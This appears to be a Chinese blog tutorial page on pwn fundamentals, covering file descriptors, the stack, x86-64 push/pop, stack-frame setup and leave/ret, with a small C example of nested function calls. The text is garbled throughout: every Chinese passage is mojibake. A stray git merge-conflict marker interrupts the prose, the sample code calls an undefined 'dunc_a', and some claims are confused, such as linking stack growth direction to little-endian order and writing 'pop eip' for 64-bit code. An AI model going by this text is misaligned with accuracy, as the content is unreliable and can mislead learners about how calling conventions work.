&lt;p&gt;æ¯ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¼šä¸ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶ç›¸å¯¹åº”ï¼Œä¸åŒçš„æ–‡ä»¶æè¿°ç¬¦ä¹Ÿå¯èƒ½æŒ‡å‘åŒä¸€ä¸ªæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;ç›¸åŒçš„æ–‡ä»¶å¯ä»¥è¢«ä¸åŒçš„è¿›ç¨‹æ‰“å¼€ï¼Œä¹Ÿå¯ä»¥åœ¨åŒä¸€ä¸ªè¿›ç¨‹è¢«å¤šæ¬¡æ‰“å¼€ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä¼šåœ¨openã€readã€writeè¿™äº›å¸¸è§å‡½æ•°ä¸­è§åˆ°ã€‚&lt;/p&gt;
&lt;p&gt;0æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰ã€1æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ã€2æ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰read(0,buf,sizeï¼‰ä»stdinä¸­è¯»sizeä¸ªæ•°æ®åˆ°bufä¸­ï¼Œwrite(1,buf,size)ä»bufä¸­å–sizeä¸ªæ•°æ®åˆ°stdoutä¸­ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ ˆstack&#34;&gt;æ ˆï¼ˆstackï¼‰
&lt;/h3&gt;&lt;p&gt;å­¦è¿‡æ•°æ®ç»“æ„éƒ½çŸ¥é“ï¼Œè¿™æ˜¯ä¸€ç§å‚¨å­˜æ–¹å¼ï¼šæ˜¯ä¸€ç§éµå¾ªã€Œåè¿›å…ˆå‡ºï¼ˆLIFO, Last In First Outï¼‰ã€åŸåˆ™çš„çº¿æ€§æ•°æ®ç»“æ„ï¼Œç±»ä¼¼äºæ—¥å¸¸ç”Ÿæ´»ä¸­å †å çš„ç›˜å­ â€”â€” æœ€åæ”¾ä¸Šå»çš„ç›˜å­ï¼Œä¼šè¢«æœ€å…ˆå–èµ°ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ ˆçš„æ ¸å¿ƒç‰¹æ€§&lt;/strong&gt;ï¼š
æ“ä½œå—é™ï¼šåªèƒ½åœ¨æ ˆçš„ä¸€ç«¯ï¼ˆé€šå¸¸ç§°ä¸ºã€Œæ ˆé¡¶ã€ï¼‰è¿›è¡Œæ•°æ®çš„æ’å…¥ï¼ˆç§°ä¸ºã€Œå…¥æ ˆã€æˆ– pushï¼‰å’Œåˆ é™¤ï¼ˆç§°ä¸ºã€Œå‡ºæ ˆã€æˆ– popï¼‰ï¼Œå¦ä¸€ç«¯ï¼ˆã€Œæ ˆåº•ã€ï¼‰å›ºå®šä¸åŠ¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;ç”±äºå‡½æ•°è°ƒç”¨é¡ºåºä¹Ÿæ˜¯LIFOï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½æ¥è§¦åˆ°çš„ç»å¤§å¤šæ•°ç³»ç»Ÿï¼Œéƒ½æ˜¯é€šè¿‡æ ˆè¿™ä¸€æ•°æ®ç»“æ„æ¥ç»´æŠ¤å‡½æ•°è°ƒç”¨å…³ç³»ã€‚&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;é¡ºåºè®¿é—®&lt;/strong&gt;ï¼šåªèƒ½ä»&lt;strong&gt;æ ˆé¡¶&lt;/strong&gt;å¼€å§‹ä¾æ¬¡è®¿é—®å…ƒç´ ï¼Œæ— æ³•ç›´æ¥è®¿é—®æ ˆä¸­é—´æˆ–æ ˆåº•çš„å…ƒç´ ã€‚&lt;/p&gt;
&lt;p&gt;è¯´å¾—æˆ‘éƒ½æ‡µäº†ï¼Œè¿™å•¥ï¼Ÿï¼Ÿé€šä¿—è®²å°±æ˜¯æ ˆå¥½æ¯”æ˜¯ä¸€ä¸ªè–¯ç‰‡ç½ï¼Œåªæœ‰ä¸€ä¸ªç½å£ï¼ŒæŠŠè–¯ç‰‡è£…è¿›å»åï¼Œæœ€åæ”¾çš„è–¯ç‰‡æ€»æ˜¯è¢«ç¬¬ä¸€ä¸ªæ‹¿å‡ºæ¥ï¼Œå€’æ•°ç¬¬äºŒä¸ªè¢«æ”¾è¿›å»çš„ï¼Œåœ¨åé¢è¢«æ‰“å¼€æ—¶éƒ½æ˜¯ç¬¬äºŒä¸ªå…ˆè¢«æ‹¿å‡ºæ¥ï¼Œè¿™å°±æ˜¯æ ˆçš„é¡ºåºè®¿é—®ç‰¹ç‚¹å•¦ï¼Œè€Œæ ˆå°±æ˜¯è–¯ç‰‡ç½è¿™ç§å­˜å‚¨å™¨çš„åå­—ã€‚&lt;/p&gt;
&lt;p&gt;ç­‰ä¼šï¼Ÿè¿™æ”¾åˆ°æœºå™¨è¯­è¨€å¦‚Cè¯­è¨€çš„è¯ï¼Œä¸å°±æ˜¯æ•°ç»„å—ï¼Ÿä¸ºä»€ä¹ˆé‚£ä¹ˆéº»çƒ¦è¦å‘æ˜è¿™ä¸ªæ ˆå‘¢ï¼Ÿå°±æ˜¯æ–¹ä¾¿ä¸€äº›ï¼Œä¸€æŠŠæ™®é€šèœåˆ€èƒ½åˆ‡æ°´æœã€å‰éª¨å¤´ï¼Œä¸ºä»€ä¹ˆè¦å‘æ˜æ°´æœåˆ€å’Œå¤§ç åˆ€ï¼ŸåŸå› å°±æ˜¯æ–¹ä¾¿ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;æ ˆå…¶å®å°±æ˜¯ä¸€ä¸ªâ€œé˜‰å‰²ç‰ˆâ€çš„æ•°ç»„ï¼Œåªèƒ½åœ¨ä¸€å¤´æ“ä½œã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h4 id=&#34;linuxç§çš„æ ˆ&#34;&gt;Linuxç§çš„æ ˆ
&lt;/h4&gt;&lt;p&gt;åœ¨linuxç³»ç»Ÿä¸­ï¼Œç³»ç»Ÿä¸ºæ¯ä¸€ä¸ªè¿›ç¨‹éƒ½å®‰æ’äº†ä¸€ä¸ªæ ˆï¼Œè¿›ç¨‹ä¸­æ¯ä¸€ä¸ªè°ƒç”¨çš„å‡½æ•°éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„æ ˆå¸§ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨linuxç³»ç»Ÿä¸­ï¼Œæ ˆæ˜¯ç”±é«˜åœ°å€å‘ä½åœ°å€&lt;strong&gt;ç”Ÿé•¿&lt;/strong&gt;ï¼ˆå°ç«¯åºï¼‰ã€‚&lt;/p&gt;
&lt;h5 id=&#34;æ¢å¥è¯è¯´é«˜åœ°å€ä¸ºæ ˆåº•ä½åœ°å€ä¸ºæ ˆé¡¶é‚£ä¹ˆä¸ºä»€ä¹ˆè¿™ä¹ˆåç›´è§‰åäººç±»çš„å®‰æ’å‘¢&#34;&gt;æ¢å¥è¯è¯´,é«˜åœ°å€ä¸ºæ ˆåº•ï¼Œä½åœ°å€ä¸ºæ ˆé¡¶ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆè¿™ä¹ˆåç›´è§‰åäººç±»çš„å®‰æ’å‘¢ï¼Ÿ
&lt;/h5&gt;&lt;p&gt;æˆ‘ä»¬æ¥è§¦åˆ°çš„ä¸€äº›ç®—æ³•ï¼Œå¾ˆå¤šéƒ½æ˜¯ç”¨æ ˆæ¥å®ç°çš„ï¼Œæ¯”å¦‚DFSã€‚DFSä¼šå°†å‘ç°çš„èŠ‚ç‚¹å­˜å‚¨åœ¨æ ˆä¸­ï¼Œç„¶åè®¿é—®çš„é¡ºåºå°±æ˜¯LIFOã€‚ä½†æ˜¯å¾ˆå¤šè¿™ç§LIFOçš„ç®—æ³•éƒ½ä¼šä»¥&lt;em&gt;&lt;strong&gt;é€’å½’&lt;/strong&gt;&lt;/em&gt;çš„å½¢å¼å®ç°ã€‚å…¶å®ï¼Œé€’å½’çš„å½¢å¼å®ç°è¿™äº›ç®—æ³•æœ¬è´¨ä¸Šæ¥è¯´ä¹Ÿæ˜¯åˆ©ç”¨æ ˆç»“æ„ï¼Œåªä¸è¿‡ä»–æ²¡æœ‰åœ¨ç¨‹åºä¸­å¦å¤–ç”³è¯·ä¸€ä¸ªæ ˆï¼Œè€Œæ˜¯ç”¨çš„å‡½æ•°è°ƒç”¨æ ˆã€‚&lt;/p&gt;
&lt;h5 id=&#34;ä¸ºä»€ä¹ˆæ ˆä»é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿&#34;&gt;ä¸ºä»€ä¹ˆæ ˆä»é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿ï¼Ÿ
&lt;/h5&gt;&lt;p&gt;æœ‰çš„è¯´æ³•æ˜¯è¿™ä¹ˆè®¾è®¡å’Œå°ç«¯åºæ›´é…åˆï¼ˆæ¯”å¦‚è¯´è®¿é—®ä¸€ä¸ªæ•°æ®çš„ä½å­—èŠ‚ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæˆ‘çš„è®¤çŸ¥æœ‰é™ï¼Œæˆ‘ä¹Ÿä¸èƒ½è§£ç­”ï¼Œè¿‡äºç†è®ºåŒ–ç ”ç©¶ä¹Ÿæ˜¯å¾ˆç‰¢çš„ã€‚è¿™åªèƒ½ç•™åˆ°æœªæ¥çš„è‡ªå·±å»è§£ç­”äº†ï¼Œè¿™é‡Œå…ˆæ ‡è®°ä¸€ä¸‹ä»¥åå†å•ç‹¬å‡ºä¸€ç¯‡Blogæ–‡ç« æ¥è®²è§£ã€‚åªèƒ½å…ˆæ­»è®°ä¸€ä¸‹å’¯/************ã€‚&lt;/p&gt;
&lt;h2 id=&#34;è°ƒç”¨çº¦å®š&#34;&gt;è°ƒç”¨çº¦å®š
&lt;/h2&gt;&lt;p&gt;çœ‹æ ‡é¢˜å°±æ˜¯å…³äºå‡½æ•°è°ƒç”¨çš„å†…å®¹ï¼Œåœ¨ä¸Šä¸€ç« æ±‡ç¼–æŒ‡ä»¤å°±æœ‰é¢„ç¤ºäº†ï¼Œåƒcallè°ƒç”¨å‡½æ•°åœ°å€ã€jmpæ— æ¡ä»¶è·³è½¬ã€‚&lt;/p&gt;
&lt;p&gt;å†æ¥å›é¡¾ä¸‹æ ˆçš„æŒ‡ä»¤ï¼š&lt;/p&gt;
&lt;p&gt;popå‡ºæ ˆ/å¼¹æ ˆï¼ŒPopæŒ‡ä»¤çš„ä½œç”¨æ˜¯å¼¹æ ˆï¼Œå°†æ ˆé¡¶çš„æ•°æ®å¼¹å‡ºåˆ°å¯„å­˜å™¨ï¼Œç„¶åæ ˆé¡¶æŒ‡é’ˆå‘ä¸‹ç§»åŠ¨ä¸€ä¸ªå•ä½ã€‚å…·ä½“æ¥è¯´ï¼šå¦‚pop raxï¼Œä½œç”¨å°±æ˜¯mov rax [rsp]ï¼›add rsp 8ï¼ˆå¹³è¡¡æ ˆæŒ‡é’ˆï¼šå½“æ‰‹åŠ¨ä¿®æ”¹æ ˆæŒ‡é’ˆåï¼ˆå¦‚ä¸´æ—¶åˆ†é…æ ˆç©ºé—´ï¼‰ï¼Œç”¨ add rsp, 8 æ¢å¤æ ˆçš„å¯¹é½çŠ¶æ€ï¼Œç¡®ä¿åç»­æ“ä½œç¬¦åˆ 8 å­—èŠ‚å¯¹é½è¦æ±‚ï¼‰ï¼›&lt;/p&gt;
&lt;p&gt;pushå‹æ ˆï¼ŒPushæŒ‡ä»¤çš„ä½œç”¨å°±æ˜¯å‹æ ˆï¼Œå°†æ ˆé¡¶æŒ‡é’ˆå‘ä¸Šç§»åŠ¨ä¸€ä¸ªå•ä½çš„è·ç¦»ï¼Œç„¶åå°†ä¸€ä¸ªå¯„å­˜å™¨çš„å€¼å­˜æ”¾åœ¨æ ˆé¡¶ï¼Œå…·ä½“æ¥è¯´ï¼šå¦‚push raxï¼Œå…¶å®é™…æ•ˆæœå°±æ˜¯ï¼šsub rsp 8; mov [rsp] raxï¼›&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-tip&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;add rsp 8çš„8æ€ä¹ˆæ¥çš„ï¼Ÿåœ¨ x86-64 æ¶æ„ï¼ˆ64 ä½ç³»ç»Ÿï¼‰ä¸­ï¼š
å¯„å­˜å™¨ï¼ˆå¦‚ rspã€rax ç­‰ï¼‰æ˜¯ 64 ä½ï¼ˆ8 å­—èŠ‚ï¼‰çš„ã€‚å†…å­˜åœ°å€ä¹Ÿæ˜¯ 64 ä½çš„ï¼Œæœ€å°çš„å¯å¯»å€å•ä½æ˜¯å­—èŠ‚ï¼Œä½†æ ˆæ“ä½œé€šå¸¸ä»¥&lt;strong&gt;8 å­—èŠ‚ä¸ºå•ä½è¿›è¡Œå¯¹é½&lt;/strong&gt;ï¼ˆè¿™æ˜¯ç³»ç»Ÿè°ƒç”¨å’Œå‡½æ•°è°ƒç”¨çš„æ ‡å‡†è¦æ±‚ï¼‰ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;å‡½æ•°è°ƒç”¨æµç¨‹&#34;&gt;å‡½æ•°è°ƒç”¨æµç¨‹
&lt;/h3&gt;&lt;p&gt;ä»ä¸€ä¸ªå®ä¾‹å‡ºå‘,mainè°ƒç”¨func_b, func_bè°ƒç”¨func_aã€‚æˆ‘ä»¬ä»mainå‡½æ•°å¼€å§‹ï¼Œé€æ­¥åˆ†ææ ˆå¸§å˜åŒ–:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;func_a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;//do sth
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;func_b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;func_a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;dunc_a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;func_b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;å½“è¿è¡Œåˆ°call func bæ—¶mainå‡½æ•°çš„æ ˆå¸§ã€‚RbpæŒ‡å‘æ ˆåº•,rspæŒ‡å‘æ ˆåº•
è¿™æ®µæ ˆå¸§å­˜æ”¾äº†ä¸€äº›mainçš„å±€éƒ¨å˜é‡ã€‚
mainå‡½æ•°è¦è°ƒç”¨func bï¼Œmainåªéœ€è¦call func bï¼Œ
ä¹Ÿå°±æ˜¯push ripï¼›mov rip func bï¼›&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæ­¤æ—¶è·³è½¬åˆ°func_bç»§ç»­æ‰§è¡Œï¼Œfunc _bç›´æ¥æ‰§è¡Œä¸»é€»è¾‘å—ï¼Ÿ
æ˜¾ç„¶ä¸æ˜¯çš„ï¼Œè¢«è°ƒç”¨å‡½æ•°è¿˜éœ€è¦ç»´æŠ¤æ ˆå¸§ã€‚&lt;/p&gt;
&lt;p&gt;å…·ä½“æ¥è¯´ï¼Œéœ€è¦ä»¥ä¸‹å‡ æ­¥ï¼š&lt;/p&gt;
&lt;p&gt;push rbpï¼›å°†è°ƒç”¨å‡½æ•°çš„æ ˆåº•æŒ‡é’ˆä¿å­˜ã€‚&lt;/p&gt;
&lt;p&gt;mov rbp rspï¼›å°†æ ˆåº•æŒ‡é’ˆæŒ‡å‘ç°åœ¨çš„æ ˆé¡¶ã€‚&lt;/p&gt;
&lt;p&gt;sub rsp xxxï¼›å¼€è¾Ÿè¢«è°ƒç”¨å‡½æ•°çš„æ ˆå¸§ï¼Œæ­¤æ—¶ä¸Šä¸€æ­¥çš„rbpå°±æŒ‡å‘æ ˆå¸§çš„åº•ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/2.png&#34;
	width=&#34;420&#34;
	height=&#34;654&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/2_hu_1c5004a635f7b9a.png 480w, https://expl0rer.top/p/pwn-1/2_hu_4c5071a9706d750a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;ç¨‹åºè¿è¡Œæ—¶å†…å­˜ä¸­æ ˆå¸§ï¼ˆstack frameï¼‰çš„ç»„ç»‡æ–¹å¼&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;64&#34;
		data-flex-basis=&#34;154px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å›¾å¾ˆæ˜äº†äº†å§ã€‚ä½†æˆ‘èµ·åˆä¸€çœ‹ï¼Œä¸ºä»€ä¹ˆint a =2æ‰€åœ¨åœ°å€è¦é«˜äºfun_bå‡½æ•°ï¼Ÿä¸æ˜¯funbå‡½æ•°è¦å…ˆæ¯”int a=2å…ˆæ‰§è¡Œå—ï¼Ÿ&lt;/p&gt;
&lt;p&gt;è‡ªé—®è‡ªç­”ï¼šè¦ç†è§£è¿™ä¸ªé—®é¢˜ï¼Œéœ€ç»“åˆå‡½æ•°è°ƒç”¨æ ˆçš„ç”Ÿé•¿æ–¹å‘å’Œä»£ç æ‰§è¡Œé¡ºåºä¸æ ˆå¸§åˆ†é…çš„å…³ç³»æ¥åˆ†æï¼Œ&lt;strong&gt;æ ˆæ˜¯ä»é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿çš„&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä»£ç æ‰§è¡Œé¡ºåºæ˜¯ï¼šmain â†’ func_b â†’ func_a â†’ è¿”å› func_b â†’ å®šä¹‰ int c = 1 â†’ è¿”å› main â†’ å®šä¹‰ int a = 2ã€‚&lt;/p&gt;
&lt;p&gt;å› ä¸º&lt;strong&gt;æ¯ä¸ªå‡½æ•°è°ƒç”¨é€šå¸¸ä¼šå ç”¨ä¸€ä¸ªæ ˆå¸§&lt;/strong&gt;ï¼Œæ‰€ä»¥è¯´fun_bå‡½æ•°ä¼šè¢«åˆ†é…åœ¨mainå‡½æ•°ä¹‹ä¸‹ï¼ˆmainå‡½æ•°å…ˆæ‰§è¡Œï¼Œå›ºç„¶mainæ˜¯ä½äºé«˜åœ°å€ï¼‰ï¼Œè€Œint a = 2 å±äº main æ ˆå¸§çš„å±€éƒ¨å˜é‡ï¼Œå› æ­¤åœ°å€é«˜äº func_b çš„æ ˆå¸§ã€‚&lt;/p&gt;
&lt;p&gt;æ¥æˆ‘ä»¬ç»§ç»­åˆ†æè¿™å›¾ï¼Œfunc_bæ‰§è¡Œå®Œç»´æŠ¤æ ˆå¸§æ“ä½œåçš„æ ˆå¸ƒå±€ã€‚
æ‰€è°“æ ˆå¸§çš„ç»´æŠ¤å°±æ˜¯ç»´æŠ¤rbpå’Œrspä¸¤ä¸ªæŒ‡é’ˆã€‚
Rspæ°¸è¿œæŒ‡å‘å½“å‰&lt;strong&gt;æ ˆçš„é¡¶éƒ¨&lt;/strong&gt;ï¼ˆRspåœ¨å“ªå’Œæ ˆé¡¶åœ¨å“ªå…³ç³»ä¸å¤§ï¼Œä½†Rspæ˜¯æŒ‡å‘å®ƒæ‰€åœ¨çš„æ ˆå¸§çš„é¡¶éƒ¨ï¼‰ã€‚
Rbpç”¨æ¥å®šä½å±€éƒ¨å˜é‡ã€‚&lt;/p&gt;
&lt;p&gt;æ¥ç€ï¼Œå†å¾€ä¸‹è¿è¡Œç¨‹åºï¼Œè°ƒç”¨func_aå‡½æ•°ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/3.png&#34;
	width=&#34;528&#34;
	height=&#34;810&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/3_hu_9a324d1379c9fdbc.png 480w, https://expl0rer.top/p/pwn-1/3_hu_1191a96fcc708a5e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;65&#34;
		data-flex-basis=&#34;156px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;é‚£è¿™é‡Œçš„æ¯ä¸€ä¸ªæ ˆå¸§å°±ä»£è¡¨æˆ‘ä¹‹å‰æ‰€è¯´çš„è–¯ç‰‡å•¦ï¼Œä¸€ç‰‡ç‰‡è¢«æ‹¿å‡ºæ¥ï¼Œä¸€ä¸ªä¸ªè¿è¡Œã€‚&lt;/p&gt;
&lt;p&gt;func_bè°ƒç”¨å®Œfunc_aåçš„æ ˆå¸ƒå±€ã€‚è‡³æ­¤ï¼Œç¤ºä¾‹çš„å‡½æ•°è°ƒç”¨å·²ç»å®Œæ¯•ã€‚
ç°åœ¨ï¼Œfunc_aæ‰§è¡Œå®Œæ¯•ï¼Œè¦è¿”å›äº†ã€‚å¦‚ä½•ç»´æŠ¤æ ˆå¸§å‘¢?&lt;/p&gt;
&lt;p&gt;åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å­¦ä¹ ä¸€ä¸ªæ–°çš„æ±‡ç¼–æŒ‡ä»¤leaveï¼š&lt;/p&gt;
&lt;p&gt;&amp;laquo;&amp;laquo;&amp;laquo;&amp;lt; HEAD
ä½œç”¨æ˜¯ç»´æŠ¤æ ˆå¸§ï¼Œé€šå¸¸å‡ºç°åœ¨å‡½æ•°çš„ç»“å°¾ï¼Œä¸retï¼ˆreturnï¼‰è¿ç”¨ã€‚å…¶å®é™…ä½œç”¨ä¸ºï¼šmov rsp rbpï¼›pop rbpï¼›å³ï¼šå°†æ ˆé¡¶æŒ‡é’ˆæŒ‡å‘æ ˆå¸§çš„åº•éƒ¨ã€ç„¶ååœ¨æ ˆä¸­å¼¹å‡ºæ–°çš„æ ˆåº•æŒ‡é’ˆã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ä¸€ä¸ªå‡½æ•°æ‰§è¡Œç»“æŸè¿”å›æ—¶ï¼Œä¼šæ‰§è¡Œleaveï¼›retï¼›&lt;/p&gt;
&lt;p&gt;å®é™…æ•ˆæœå°±æ˜¯ï¼šmov rsp rbpï¼› poprbpï¼› pop eipï¼›
æ­¤æ—¶æˆ‘ä»¬è§‚å¯Ÿç¨‹åºæ‰§è¡Œå®Œfunc_aæ—¶çš„æ ˆå¸§ï¼Œå¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/4.png&#34;
	width=&#34;495&#34;
	height=&#34;805&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/4_hu_2cb24e1acdfb25b3.png 480w, https://expl0rer.top/p/pwn-1/4_hu_2c5470e10b698a3a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;61&#34;
		data-flex-basis=&#34;147px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥è¯´ï¼Œä¸ä¹‹å‰çš„func_bæœªè°ƒç”¨func_aå‰çš„æ ˆå¸§å¯¹æ¯”ï¼Œæ˜¯ä¸€æ¨¡ä¸€æ ·ï¼Œè¯´æ˜å·²ç»æ¢å¤äº†æ ˆå¸§ã€‚å”¯ä¸€ä¸åŒä¹‹å¤„åœ¨äºæ­¤æ—¶ç¨‹åºçš„ripå·²ç»æŒ‡å‘äº†c=1åé¢ä¸€æ¡æŒ‡ä»¤ï¼Œè¯´æ˜func_aå·²ç»æ‰§è¡Œå®Œæ¯•ã€‚&lt;/p&gt;
